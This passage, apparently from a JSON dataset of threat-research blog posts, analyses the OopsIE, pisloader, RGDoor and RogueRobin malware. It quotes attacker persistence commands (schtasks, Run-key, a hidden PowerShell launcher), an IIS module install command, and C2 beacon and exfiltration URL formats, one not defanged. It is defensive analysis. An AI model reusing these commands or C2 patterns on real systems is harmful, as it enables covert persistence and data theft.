                "Secondly, the CPU temperature check seen in this payload was previously used by GravityRAT, as discussed earlier this year by security researchers at Talos.",
                "They noted that while virtual machines were detected by this technique, some physical systems were also detected as virtual machines because they did not support the WMI query.",
                "This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query.",
                "The last technique that was particularly interesting is the time zone check, as the Trojan will not execute its functional code if the system does not have a specific time zone set.",
                "The Trojan compares the TimeZone.CurrentTimeZone.DaylightName property to strings Iran, Arab, Arabia and Middle East, which will match the following time zones in Windows:\n\nArabic Daylight Time (UTC+3)\nArab Daylight Time (UTC+3)\nArabian Daylight Time (UTC+4)\nMiddle East Daylight Time (UTC+2)\nIran Daylight Time (UTC+3.5)\nAccording to MSDN, these five time zones encompass 10 countries that fall within UTC+2, +3, +3.5 or +4 as seen in Figure 3.",
                "The fact that the Trojan will not operate on systems that are not configured with these time zones suggests that this is a highly targeted attack focused on a specific subset of target nations."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Countries in which OopsIE will run in based on the time zone"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Notable Differences\nThe OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE variant discussed in our previous blog.",
                "The main similarities include the use of a scheduled task to persistently execute on the system, as well as the same general process to communicate with its C2 server.",
                "For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands.",
                "Also, this version of the Trojan inspects HTTP responses from the C2 server for the tags <pre> and </pre> and will parse that data for commands.",
                "However, there are many differences introduced to this version of OopsIE from the previously discussed variant.",
                "At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character.",
                "The following code snippet was used to decode strings within OopsIE:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis environment, as discussed in the previous section.",
                "The last check requires the user to click the Ok button in an error dialog box, as seen in Figure 4."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Error dialog box displayed by OopsIE"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After displaying the error dialog box, the Trojan will sleep for two seconds by running the following command that runs the choice application.",
                "The use of the choice command, as seen below, did not appear in previous versions of OopsIE and appears to have been added in the most recent version used in this attack.",
                "cmd.exe /C choice /C Y /N /D",
                "Y /T 2 & Del\nAfter sleeping, the Trojan will create a GUID and write it to %APPDATA%\\Windows\\GDI.bin.",
                "It then moves itself to %APPDATA%\\Windows\\WindowsImplantment.exe and sets both of these files to have the hidden and system flags to hide them from the user.",
                "With the Trojan moved its final location, it will then create a scheduled task to run a VBScript to make sure it runs persistently.",
                "The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run.",
                "The decoded string from the Sch resource is:",
                "SchTasks /Create",
                "/SC",
                "MINUTE /MO 3",
                "/TN \"%n%\" /TR \"wscript %path%\" /f\nThe decoded string from the VBS resource is:\nCreateObject(\"WScript.Shell\").Run(\"%app%\")\nThe %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin.",
                "This differs from the previous OopsIE variant that used a hardcoded task name for the scheduled task.",
                "The %path% string in the scheduled task command will be replaced with the path to the following:\n%APPDATA%\\Windows\\ShwDoc.VBS\nThe decoded string from the VBS resource is written to ShwDoc.VBS.",
                "The %app% string in the VBScript is replaced with %APPDATA%\\Windows\\WindowsImplantment.exe.",
                "This process ultimately attempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled task as it does not include a main loop to continue its execution.",
                "After creating this scheduled task for persistence, the Trojan will begin communicating with its C2 server.",
                "The process in which the Trojan communicates with its C2 server is very similar to the previous OopsIE Trojan that we discussed in our previous blog.",
                "This particular sample uses the following domain as its C2 server:\nwww.windowspatch[.]com\nOne obvious difference between this version of OopsIE compared to the previously analyzed version is the strings in the C2 URLs are reversed, from chk to khc, what to tahw and resp to pser.",
                "Also, the oops string used to signify and erroneous transmission from the C2, which gave OopsIE its name is reversed to spoo.",
                "Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables.",
                "The C2 communications begins with a beacon to the following URL:\nhxxp://www.windowspatch[.]com/khc?<hex(STDOUT of whoami command)>\nIf the C2 server wishes to send a command, it will respond to the beacon above by echoing the whoami command results sent by the Trojan to the C2 in the URL.",
                "If the Trojan receives this echo, it will create the following file that the Trojan uses as a signal that it was able to successfully communicate with its C2 server:\n%APPDATA%\\Windows\\ShwDoc.srv\nIf the Trojan determines the C2 server wishes to send a command, it sends an HTTP request to the following URL:\nhxxp://www.windowspatch[.]com/tahw?<hex(STDOUT of whoami command)>\nThe Trojan will first check the response to this request for the string spoo, which signifies the C2 does not wish to issue a command.",
                "Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments.",
                "The command handler in this OopsIE variant is very similar to the previous version, as it contains the same three (1, 2 and 3) commands seen in Table 2.",
                "The one difference in this command handler from the previous version is the boom!",
                "command, which allows the actor to uninstall the OopsIE Trojan from the system."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 OopsIE commands"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When sending data to the C2 server after running commands, the Trojan will use the following URL structure with either BBY or BBZ splitting the whoami output and the exfiltrated data:\nhttp://www.windowspatch.com/pser?<hex(STDOUT of whoami command)(BBZ|BBY)hex(up to 1000 bytes of hexadecimal data)>\n\nConclusion\nThe OilRig group remains a persistent adversary in the Middle East region.",
                "They continue to iterate and add capabilities to their tools while still functionally using the same tactics over and over again.",
                "Within the time frame we have been tracking the OilRig group, they have repeatedly shown a willingness to add less commonly found functionality to their tools, such as their heavy use of DNS tunneling in their backdoors or adding authentication to their webshells.",
                "This attack is no different, now adding anti-analysis capabilities into their tools.",
                "This adversary is highly resourceful and continues to adapt over time.",
                "However, the tactics they continue to deploy are generally unsophisticated, and simple security hygiene would help organizations protect themselves against this threat.",
                "Palo Alto Networks customers are protected from this OilRig attack campaign and OopsIE by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise\nOopsIE Trojan\n36e66597a3ff808acf9b3ed9bc93a33a027678b1e262707682a2fd1de7731e23\n055b7607848777634b2b17a5c51da7949829ff88084c3cb30bcb3e58aae5d8e9\n6b240178eedba4ebc9f1c8b56bac02676ce896e609577f4fb64fa977d67c0761\n9e8ec04e534db1e714159cc68891be454c2459f179ab1df27d7f89d2b6793b17\n\nOopsIE C2\ndefender-update[.]com\nwindowspatch[.]com"
            ]
        }
    ],
    "e3b313e802dd9aedeb1e976ab83fd004ccdbd58c": [
        {
            "type": "paragraph",
            "content": [
                "We have observed an attack led by the APT group Wekby targeting a US-based organization in recent weeks.",
                "Wekby is a group that has been active for a number of years, targeting various industries such as healthcare, telecommunications, aerospace, defense, and high tech.",
                "The group is known to leverage recently released exploits very shortly after those exploits are available, such as in the case of HackingTeams Flash zero-day exploit."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware used by the Wekby group has ties to the HTTPBrowser malware family, and uses DNS requests as a command and control mechanism.",
                "Additionally, it uses various obfuscation techniques to thwart researchers during analysis.",
                "Based on metadata seen in the discussed samples, Palo Alto Networks has named this malware family pisloader."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The pisloader malware family was delivered via HTTP from the following URL.",
                "At the time of writing, this URL was still active."
            ]
        },
        {
            "type": "caption",
            "content": [
                "http://globalprint-us[.]com/proxy_plugin.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Other samples hosted on this domain include the following:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "http://globalprint-us[.]com/proxy_web_plugin.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: E4968C8060EA017B5E5756C16B80B012\nSHA256: 8FFBB7A80EFA9EE79E996ABDE7A95CF8DC6F9A41F9026672A8DBD95539FEA82A\nSize: 126976 Bytes\nCompile Time: 2016-04-28 00:38:46 UTC"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This discovered file was found to be an instance of the common Poison Ivy malware family with the following configuration data:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Command and Control Address: intranetwabcam[.]com\nCommand and Control Port: 80\nPassword: admin\nMutex: )!VoqA.I5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The domains witnessed in this attack were all registered very shortly prior to being used.",
                "The following domains have been witnessed in this attack:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the following IP resolutions have been observed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following sample was discovered initially and is referenced in the subsequent analysis:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: E8D58AA76DD97536AC225949A2767E05\nSHA256: DA3261C332E72E4C1641CA0DE439AF280E064B224D950817A11922A8078B11F1\nSize: 126976 Bytes\nCompile Time: 2016-04-27 14:37:34 UTC"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This particular file has the following metadata properties.",
                "The references to pisload2 led to the naming of this malware family."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 pisloader dropper metadata"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial dropper contains very simple code that is responsible for setting persistence via the Run registry key, and dropping and executing an embedded Windows executable.",
                "Limited obfuscation was encountered, where the authors split up strings into smaller sub-strings and used strcpy and strcat calls to re-build them prior to use.",
                "They also used this same technique to generate garbage strings that are never used.",
                "This is likely to deter detection and analysis of the sample.",
                "The following decompiled code demonstrates this.",
                "Comments have been added to show the fully-generated strings."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 pisloader dropper building strings and setting persistence"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the above decompiled code, we see that the pisloader is generating the following string, which eventually is called to set the Run registry key."
            ]
        },
        {
            "type": "caption",
            "content": [
                "cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v lsm /t",
                "reg_sz /d",
                "\"%appdata%\\lsm.exe\" /f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This particular command will set the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\lsm registry key with a value of %appdata%\\lsm.exe.",
                "After this key is set, the malware proceeds to decrypt a two blobs of data with a single-byte XOR key of 0x54.",
                "The resulting data is written to the %appdata%\\lsm.exe file path."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this file is written, the malware executes the newly written lsm.exe file, which contains the pisloader payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following sample was discovered and is referenced in the subsequent analysis:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: 07B9B62FB3B1C068837C188FEFBD5DE9\nSHA256: 456FFFC256422AD667CA023D694494881BAED1496A3067485D56ECC8FEFBFAEB\nSize: 102400 Bytes\nCompile Timestamp: 2016-04-27 13:39:02 UTC"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload is heavily obfuscated using a return-oriented programming (ROP) technique, as well as a number of garbage assembly instructions.",
                "In the example below, code highlighted in red essentially serves no purpose other than to deter reverse-engineering of the sample.",
                "This code can be treated as garbage and ignored.",
                "The entirety of the function is highlighted in green, where two function offsets are pushed to the stack, followed by a return instruction.",
                "This return instruction will point code execution first at the null function, which in turn will point code execution to the next_function.",
                "This technique is used throughout the runtime of the payload, making static analysis difficult."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Obfuscated code witnessed in pisloader"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware is actually quite simplistic once the obfuscation and garbage code is ignored.",
                "It will begin by generating a random 10-byte alpha-numeric header.",
                "The remaining data is base32-encoded, with padding removed.",
                "This data will be used to populate a subdomain that will be used in a subsequent DNS request for a TXT record."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The use of DNS as a C2 protocol has historically not been widely adopted by malware authors.",
                "Notable exceptions include the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The use of DNS as a C2 allows pisloader to bypass certain security products that may not be inspecting this traffic correctly."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 DNS query for TXT record by malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The pisloader sample will send a beacon periodically that is composed of a random 4-byte uppercase string that is used as the payload.",
                "An example of this can be found below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 pisloader DNS beacon request"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware expects various aspects of the DNS responses to be set in a specific way, or else pisloader will ignore the DNS reply.",
                "The following DNS flags must be set.",
                "Should any additional flags be set, the response will be ignored."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Questions field must be set to a value of 0x1.",
                "The Answer Resource Records field must be set to a value of 0x1.",
                "Additionally, the response query subdomain must match the original DNS request."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The remote command and control (C2) server is statically embedded within the malware.",
                "A single host of ns1.logitech-usa[.]com is found in this specific sample."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 server will respond with a TXT record that is encoded similar to the initial request.",
                "In the response, the first byte is ignored, and the remaining data is base32-encoded.",
                "An example of this can be found below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Example TXT response by C2 server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following commands, and their descriptions are supported by the malware:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Some examples of these commands being used can be seen below.",
                "A mock DNS server was used to generate the commands and receive the resulting data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example sending the drive command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example sending the open command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example sending the sifo command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example listing the contents of the C:\\ drive:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sifo command above uses the printf format string of l=%s&c=%s&o=%s.",
                "This is consistent with previous versions of HTTPBrowser, which is another malware family frequently used by the Wekby group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, a number of commands themselves, such as the list, drive, and upload commands are consistent with HTTPBrowser.",
                "The formatted responses from these commands are also identical.",
                "A known HTTPBrowser sample was spotted with similar metadata as the discussed pisloader sample, which adds further credibility that pisloader is likely a variant of this malware family."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the code used to generate these commands is available via GitHub."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Wekby group continues to target various high profile organizations using sophisticated malware.",
                "The pisloader malware family uses various novel techniques, such as using DNS as a C2 protocol, as well as making use of return-oriented programming and other anti-analysis tactics."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected against this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "External Resources"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "da3261c332e72e4c1641ca0de439af280e064b224d950817a11922a8078b11f1\n930772d6af8f43f62ea78092914fa8d6b03e8e3360dd4678eec1a3dda17206ed\n6852ba95720af64809995e04f4818517ca1bd650bc42ea86d9adfdb018d6b274\n9200f80c08b21ebae065141f0367f9c88f8fed896b0b4af9ec30fc98c606129b\n4d62caef1ca8f4f9aead7823c95228a52852a1145ca6aaa58ad8493e042aed16\n1b341dab023de64598d80456349db146aafe9b9e2ec24490c7d0ac881cecc094\n456fffc256422ad667ca023d694494881baed1496a3067485d56ecc8fefbfaeb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domains"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1.logitech-usa[.]com\nglobalprint-us[.]com\nintranetwabcam[.]com\nlogin.access-mail[.]com\nglb.it-desktop[.]com\nlocal.it-desktop[.]com\nhi.getgo2[.]com"
            ]
        }
    ],
    "b37e3dfafdca1e370ec426f80f10d6d82f1a8fe7": [
        {
            "type": "paragraph",
            "content": [
                "Summary\nWhile investigating files uploaded to a TwoFace webshell, Unit 42 discovered actors installing an Internet Information Services (IIS) backdoor that we call RGDoor.",
                "Our data suggests that actors have deployed the RGDoor backdoor on webservers belonging to eight Middle Eastern government organizations, as well as one financial and one educational institution.",
                "We believe the actors deploy RGDoor as a secondary backdoor to regain access to a compromised webserver in the event a victim organization detects and removes the TwoFace shell.",
                "We do not have HTTP logs that show the actor interacting with RGDoor, so we do not know the activities the actors carry out using the backdoor.",
                "However, we were able to create a client application to interact with RGDoor for testing purposes, which allowed us to interact with the backdoor to see how it operates on an IIS server.\n\nRGDoor\n\nUnlike TwoFace, the actors did not develop RGDoor in C# to be interacted with at specific URLs hosted by the targeted IIS web server.",
                "Instead, the developer created RGDoor using C++, which results in a compiled dynamic link library (DLL).",
                "The DLL has an exported function named \"RegisterModule\", which is important as it led us to believe that this DLL was used as a custom native-code HTTP module that the threat actor would load into IIS.",
                "Starting with IIS 7, developers could create modules in C++ that the IIS webserver would load to extend IIS' capabilities, such as carry out custom actions on requests.",
                "The fact that RGDoor is an IIS HTTP module suggests that there is no visual representation of the shell for actors to interact with, which also differs from TwoFaces interface that actors can interact with by visiting the URL to the TwoFace ASPX file.",
                "According to Microsofts documentation, native-code modules can be installed either in the IIS Manager GUI or via the command-line using the appcmd application.",
                "While we do not have logs to determine exactly how the actors install RGDoor, the actor can use the TwoFace webshell to install the RGDoor module via the command line.",
                "The following command could be used to install the HTTP module on an IIS server:\n%systemroot%\\system32\\inetsrv\\APPCMD.EXE install module /name:[module name] /image:[path to RGDoor DLL] /add:true\nWe confirmed the command above successfully installed the RGDoor backdoor in our test environment.",
                "Figure 1 shows the specific command we used to install RGDoor on our IIS server."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Command-line used to install RGDoor module into IIS"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We confirmed RGDoor installed correctly into IIS by checking the HTTP Modules display in IIS Manager.",
                "Figure 2 shows the RGDoor DLL (HTTPParser.dll) was loaded into IIS using the module name HTTPParser."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Installed RGDoor module displayed in the HTTP Modules list in IIS Manger"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Listening for Commands\nWe analyzed RGDoor samples and found that the \"RegisterModule\" function does very little other than calling the IHttpModuleRegistrationInfo::SetRequestNotifications method.",
                "According to MSDN, the SetRequestNotifications function has the following prototype, which allows a developer to configure the module to handle GET requests (dwRequestNotifications) and/or POST requests (dwPostRequestNotifications):\nSetRequestNotifications(\n IN IHttpModuleFactory",
                "* pModuleFactory,\n IN DWORD dwRequestNotifications,\n IN DWORD dwPostRequestNotifications\n )\nIn RGDoor, the code calls this function with arguments that ignore inbound HTTP GET requests, but act on all HTTP POST requests seen by the IIS server, even POST requests issued over HTTPS.",
                "RGDoor calls this function with the following arguments, the third of which (dwPostRequestNotifications) is set to RQ_BEGIN_REQUEST, which is an event triggered immediately after IIS receives the POST request:\nSetRequestNotifications(pModuleFactory,0,RQ_BEGIN_REQUEST)\n\nRGDoor is notified immediately when the IIS server receives an inbound HTTP POST request.",
                "RGDoor parses these POST requests, specifically looking for the HTTP Cookie field by accessing the HTTP header with the following function call:\npHttpContext->GetRequest()->GetHeader(\"Cookie\",NULL)\nAfter accessing the cookie field, RGDoor parses this field by looking for the string \"RGSESSIONID=\", which is the basis for the name RGDoor.",
                "If present, the code uses the two-bytes immediately following the \"RGSESSIONID=\" string as a decryption key, specifically treating the two character bytes as a single hexadecimal byte.",
                "For instance, the two-byte key of 00 would represent the hexadecimal value of 0x00, where FF would represent 0xff, and so on.",
                "The key is followed by a Base64 encoded string that contains ciphertext.",
                "The following represents the structure of the cookie filed in inbound RGDoor requests:\nRGSESSIONID=[two-bytes for key][Base64 encoded ciphertext]\nRGDoor decodes the Base64 encoded string and then decrypts the decoded string using a custom algorithm.",
                "The custom algorithm iterates through the ciphertext using the 'pxor' instruction to XOR each byte of ciphertext with the single-byte hexadecimal value from the two-byte character key provided in the cookie field.",
                "The code will parse the cleartext looking for one of three commands: cmd$, upload$ and download$.",
                "The code treats the string immediately following the command as the commands argument.",
                "Table 1 provides the arguments and further details on the three commands."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Commands available within RGDoor"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Responding to Commands\nWhen responding to inbound requests, the code will clear the response that IIS would have responded to the HTTP POST request by calling the following functions:\npHttpContext->GetResponse()->Clear()\nRGDoor then constructs its own HTTP response by first setting the \"Content-Type\" field within the HTTP header to \"text/plain\".",
                "Figure 3 shows the code that uses the IHttpResponse::SetHeader method to set the Content-Type field within the HTTP response to text/plain, specifically by using a value of 0xC (0xA + 2) for the ulHeaderIndex within HTTP_HEADER_ID enumeration."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 RGDoor code to set the HTTP Content-Type to \"text/plain\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample then transmits the data back to the actor by creating a loop that calls the IHttpResponse::WriteEntityChunk method until all of the data is sent to the actor within HTTP responses.",
                "If the WriteEntityChunk method fails at any point during this loop, the code will respond to the actor with a HTTP 500 Server Error response by using the IHttpResponse::SetStatus method.",
                "Interacting with RGDoor\nWe created a client application to interact with the RGDoor module, specifically to issue commands to the backdoor and to see how it operates on the IIS server.",
                "As mentioned previously in this blog, RGDoor has three available commands, specifically cmd$, upload$ and download$.",
                "We used our client to issue one of each of these commands.",
                "Figure 4 shows the HTTP request and response to our first interaction with the RGDoor module.",
                "The command issued in this request was cmd$whoami, which instructs RGDoor to run the whoami command in command prompt.",
                "The key used to encrypt this command was 54 (0x54), which resulted in Base64 encoded string of NzkwcCM8OzU5PQ==. The HTTP response shows the RGDoor module returned the Base64 encoded string of PT0ndDUkJCQ7OzgIMDEyNSE4IDUkJCQ7OzheVA==, which when decrypted using the same 54 key is the result of the whoami command, specifically the string iis apppool\\\\defaultapppool\\n\\x00."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Issuing 'whoami' command and RGDoor's response"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5 shows our testing of RGDoors upload command, specifically upload$c:\\windows\\temp\\test.txt that uploads a file from our local system to the webserver.",
                "The inbound request uses a key of 54 (0x54) that results in an encoded command string of ISQ4OzUwcDduCCM9OjA7IycIIDE5JAggMScgeiAsIA=.",
                "The request also includes the string IDEnID06M2VmZ14= within the POST data, which is the string testing123\\n from the file on our local system encrypted using the 54 key that will be written to the test.txt file on the server.",
                "As you can see from the HTTP response, RGDoor responded to this command with write done, which is interesting as the response was in cleartext and not encrypted using the custom algorithm."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Uploading a file to server via RGDoor\u00a0Downloading a file from the server via RGDoor"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6 shows our testing of the download command within RGDoor, specifically a command download$c:\\windows\\temp\\test.txt that downloads the file uploaded in our previous test.",
                "We chose to use the key 89 (0x89) in this test to showcase RGDoors ability to use any hexadecimal byte as a key, which resulted in an encoded command string of 7eb+5+Xm6O2t6rPV/uDn7eb++tX97OT51f3s+v2n/fH9.",
                "RGDoor responds to this command with the encoded string /ez6/eDn7ri7uoM=, which when decrypted with the 89 key results in the string 'testing123\\n', which is the contents of the test.txt file."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Downloading a file from the server via RGDoor"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To determine how the RGDoor client requests appears within the IIS request logs, we checked the logs of our default IIS installation in our test environment.",
                "By default, IIS does not log the values within Cookie fields of inbound HTTP requests, which would contain commands issued by actors to RGDoor.",
                "To see inbound RGDoor requests, an administrator must configure logging of Cookie fields in IIS, which can be selected in the W3C Logging Fields dialog in IIS Manager, as seen in Figure 7."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7",
                "W3C Logging Fields dialog in IIS Manager with Cookie fields enabled"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The HTTP requests sent by the client to the RGDoor backdoor in the testing above will generate logs on the IIS server.",
                "Without the Cookie field logged, it is difficult to locate and analyze inbound requests related to RGDoor.",
                "Remember that RGDoor is an IIS module that checks all inbound POST requests for commands, so an actor does not need to use one particular URL to interact with RGDoor.",
                "However, the following shows the IIS log generated from the first testing request we made using our RGDoor client, which shows the RGSESSIONID= string, the 54 key and the Base64 encoded command within the Cookie field:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nRGDoor is an IIS backdoor that actors used the TwoFace webshell to load onto an IIS web server.",
                "The RGDoor provides backdoor access to the compromised server, which we speculate the actors loaded in order to regain access to the server in the event the TwoFace webshell was removed.",
                "This backdoor has a rather limited set of commands, however, the three commands provide plenty of functionality for a competent backdoor, as they allow an actor to upload and download files to the sever, as well as run commands via command prompt.",
                "The use of RGDoor suggests that this group has contingency plans to regain access to a compromised network in the event their webshells are discovered and remediated.",
                "Palo Alto Networks customers are protected from RGDoor by the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "RGDoor SHA256\n497e6965120a7ca6644da9b8291c65901e78d302139d221fcf0a3ec6c5cf9de3\na9c92b29ee05c1522715c7a2f9c543740b60e36373cb47b5620b1f3d8ad96bfa\nRGDoor Filenames\nHTTPParser.dll\nTrafficHandler.dll\niishandler6.dll"
            ]
        }
    ],
    "1b27e1e0ef9a8be4858e4f45a80165e655ed74a6": [
        {
            "type": "paragraph",
            "content": [
                "In July 2018, Unit 42 analyzed a targeted attack using a novel file type against at least one government agency in the Middle East.",
                "It was carried out by a previously unpublished threat group we track as DarkHydrus.",
                "Based on our telemetry, we were able to uncover additional artifacts leading us to believe this adversary group has been in operation with their current playbook since early 2016.",
                "This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy).",
                ".iqy files are simple text files containing a URL which are opened by default by Excel.",
                "Once opened, Excel will retrieve whatever object is at the URL inside the file.",
                "These files have most recently been found in use by criminals to deliver commodity RATs such as Flawed Ammyy.",
                "In DarkHydrus's case, the preferred payload retrieved in their previous attacks were exclusively open-source legitimate tools which they abuse for malicious purposes, such as Meterpreter and Cobalt Strike.",
                "However, in this instance, it appears that this group used a custom PowerShell based payload that we call RogueRobin."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attack Analysis\nThe actors sent the spear-phishing emails between July 15 and 16.",
                "Each of the emails had a password protected RAR archive attached named credential.rar.",
                "The body of the message, seen in Figure 1 was written in Arabic and asks the recipient to review the document within the archive.",
                "The message also includes the password 123456 that is required to open the RAR archive.",
                "The credential.rar archive contained a malicious .iqy file named credential.iqy."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Message body in delivery email"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Google Translate renders the Arabic message as:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hi",
                "Please review and review the attached file\nGratefully\nPassword: 123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Payload Analysis\nThe credential.iqy is an .iqy file (SHA256: cc1966eff7bed11c1faada0bb0ed0c8715404abd936cfa816cef61863a0c1dd6) that contains nothing more than the following text string:\nhxxp://micrrosoft[.]net/releasenotes.txt\nMicrosoft Excel natively opens .iqy files and will use the URL in the file to obtain remote data to include in the spreadsheets.",
                "By default, Excel does not allow the download of data from the remote server, but will ask for the users consent by presenting the dialog box in Figure 2:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Excel security notice for .iqy files"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "By enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file.",
                "The contents within the releasenotes.txt file (SHA256: bf925f340920111b385078f3785f486fff1096fd0847b993892ff1ee3580fa9d) contains the following formula that Excel will save to the A0 cell in the worksheet:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The formula uses a command prompt to run a PowerShell script that attempts to download and execute a second PowerShell script hosted at the URL hxxp://micrrosoft[.]net/winupdate.ps1.",
                "By default, Excel will not launch the command prompt application, but will do so with the users consent via the following dialog box in Figure 3:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Confirmation of access of remote data"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The winupdate.ps1 script (SHA256: 36862f654c3356d2177b5d35a410c78ff9803d1d7d20da0b82e3d69d640e856e) is the main payload of this attack that we call RogueRobin.",
                "Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation.",
                "The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool.",
                "Before carrying out any of its functionality the payload checks to see if it is executing in a sandbox.",
                "The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment.",
                "The specific sandbox checks include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the payload determines it is not running in a sandbox, it will attempt to install itself to the system to persistently execute.",
                "To install the payload, the script will create a file %APPDATA%\\OneDrive.bat and save the following string to it:\npowershell.exe -WindowStyle",
                "Hidden -exec bypass -File",
                "\"%APPDATA%\\OneDrive.ps1\"\nThe script then writes a modified copy of itself to %APPDATA%\\OneDrive.ps1, with the code that performs this installation omitted.",
